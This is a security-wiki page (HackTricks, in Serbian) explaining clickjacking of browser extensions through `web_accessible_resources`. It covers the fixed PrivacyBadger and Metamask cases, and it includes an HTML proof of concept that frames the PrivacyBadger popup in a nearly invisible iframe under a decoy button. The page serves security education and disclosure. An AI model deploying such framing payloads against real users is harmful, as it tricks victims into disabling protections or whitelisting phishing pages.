# BrowExt - ClickJacking

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Osnovne informacije

Ova stranica će iskoristiti ClickJacking ranjivost u Browser ekstenziji.\
Ako ne znate šta je ClickJacking, proverite:

{% content-ref url="../clickjacking.md" %}
[clickjacking.md](../clickjacking.md)
{% endcontent-ref %}

Ekstenzije sadrže fajl **`manifest.json`** i taj JSON fajl ima polje `web_accessible_resources`. Evo šta [Chrome dokumentacija](https://developer.chrome.com/extensions/manifest/web\_accessible\_resources) kaže o tome:

> Ovi resursi bi bili dostupni na veb stranici putem URL-a **`chrome-extension://[PACKAGE ID]/[PATH]`**, koji se može generisati pomoću metode **`extension.getURL`**. Resursi na dozvoljenoj listi se serviraju sa odgovarajućim CORS zaglavljima, tako da su dostupni putem mehanizama kao što je XHR.[1](https://blog.lizzie.io/clickjacking-privacy-badger.html#fn.1)

**`web_accessible_resources`** u browser ekstenziji nisu samo dostupni putem veba; oni takođe rade sa inherentnim privilegijama ekstenzije. To znači da imaju mogućnost da:

- Menjaju stanje ekstenzije
- Učitavaju dodatne resurse
- Interaguju sa pregledačem do određene mere

Međutim, ova funkcionalnost predstavlja sigurnosni rizik. Ako resurs unutar **`web_accessible_resources`** ima značajnu funkcionalnost, napadač bi potencijalno mogao da ugradi ovaj resurs u spoljnu veb stranicu. Nesumnjivi korisnici koji posete ovu stranicu mogu nenamerno aktivirati ovaj ugrađeni resurs. Takva aktivacija može dovesti do neželjenih posledica, u zavisnosti od dozvola i mogućnosti resursa ekstenzije.

## Primer PrivacyBadger-a

U ekstenziji PrivacyBadger, identifikovana je ranjivost koja se odnosi na `skin/` direktorijum koji je deklarisan kao `web_accessible_resources` na sledeći način (Proverite originalni [blog post](https://blog.lizzie.io/clickjacking-privacy-badger.html)):
```json
"web_accessible_resources": [
"skin/*",
"icons/*"
]
```
Ova konfiguracija dovela je do potencijalnog sigurnosnog problema. Konkretno, datoteka `skin/popup.html`, koja se prikazuje prilikom interakcije sa ikonom PrivacyBadger u pregledaču, mogla bi biti ugrađena unutar `iframe`-a. Ovo ugrađivanje može biti iskorišćeno kako bi se korisnici prevarili da nenamerno kliknu na "Onemogući PrivacyBadger za ovaj sajt". Takvo postupanje bi ugrozilo privatnost korisnika onemogućavanjem zaštite PrivacyBadger-a i potencijalno izložilo korisnika povećanom praćenju. Vizuelnu demonstraciju ovog napada možete pogledati u primeru video zapisa ClickJacking-a koji je dostupan na [**https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm**](https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm).

Da bi se rešila ova ranjivost, implementirano je jednostavno rešenje: uklanjanje `/skin/*` sa liste `web_accessible_resources`. Ova promena efikasno umanjuje rizik osiguravajući da sadržaj direktorijuma `skin/` ne može biti pristupan ili manipulisan putem web-pristupačnih resursa.

Popravka je jednostavna: **uklonite `/skin/*` iz `web_accessible_resources`**.

### PoC
```html
<!--https://blog.lizzie.io/clickjacking-privacy-badger.html-->

<style>
iframe {
width: 430px;
height: 300px;
opacity: 0.01;
float: top;
position: absolute;
}

#stuff {
float: top;
position: absolute;
}

button {
float: top;
position: absolute;
top: 168px;
left: 100px;
}

</style>

<div id="stuff">
<h1>
Click the button
</h1>
<button id="button">
click me
</button>
</div>

<iframe src="chrome-extension://ablpimhddhnaldgkfbpafchflffallca/skin/popup.html">
</iframe>
```
## Primer sa Metamaskom

[**Blog post o ClickJacking-u u Metamasku možete pronaći ovde**](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9). U ovom slučaju, Metamask je popravio ranjivost proverom da li je korišćeni protokol za pristup bio **`https:`** ili **`http:`** (a ne na primer **`chrome:`**):

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

**Još jedan popravljen ClickJacking** u Metamask ekstenziji bio je taj što su korisnici mogli **kliknuti da dodaju na belu listu** kada je stranica bila sumnjiva zbog toga što je imala `“web_accessible_resources”: [“inpage.js”, “phishing.html”]`. Pošto je ta stranica bila ranjiva na Clickjacking, napadač bi mogao da je zloupotrebi prikazujući nešto normalno kako bi žrtva kliknula da je doda na belu listu, a da to ne primeti, a zatim se vratiti na stranicu za ribarenje koja će biti na beloj listi.

## Primer sa Steam Inventory Helperom

Pogledajte sledeću stranicu da biste videli kako je **XSS** u browser ekstenziji povezan sa ranjivošću **ClickJacking**:

{% content-ref url="browext-xss-example.md" %}
[browext-xss-example.md](browext-xss-example.md)
{% endcontent-ref %}

## Reference

* [https://blog.lizzie.io/clickjacking-privacy-badger.html](https://blog.lizzie.io/clickjacking-privacy-badger.html)
* [https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9)

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini da podržite HackTricks:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
